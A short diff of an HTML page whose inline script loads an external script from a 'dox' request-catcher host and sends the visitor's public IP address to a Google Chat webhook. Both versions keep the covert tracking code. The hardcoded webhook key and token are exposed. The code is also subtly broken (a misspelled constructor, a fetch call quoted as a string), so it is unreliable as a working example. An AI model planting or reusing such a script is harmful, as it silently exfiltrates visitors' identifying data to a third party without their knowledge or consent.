@@ -6,11 +6,11 @@
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <script src="https://dox.requestcatcher.com/"></script>
     <script>
-      var  url = "https://chat.googleapis.com/v1/spaces/AAAAPVoBJM8/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=vXbMWyaGjzPohuRwr8UpIYZpfthuKu2zcjHbObWsdtI"
-      var msg = fetch("https://wtfismyip.com/text")
+      var url = "https://chat.googleapis.com/v1/spaces/AAAAPVoBJM8/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=vXbMWyaGjzPohuRwr8UpIYZpfthuKu2zcjHbObWsdtI"
+      var msg = `fetch("https://wtfismyip.com/text")`
       var xhr = newXMLHttpRequest();
       xhr.open("POST", `${url}`);
-      xhr.setRequestHeader('Content-type', 'application/json');
+      xhr.setRequestHeader('Content-type', 'application/json; charset=UTF-8');
       xhr.send(`{ "text": "${msg}" }`);
       xhr.getAllResponseHeaders()
     </script>
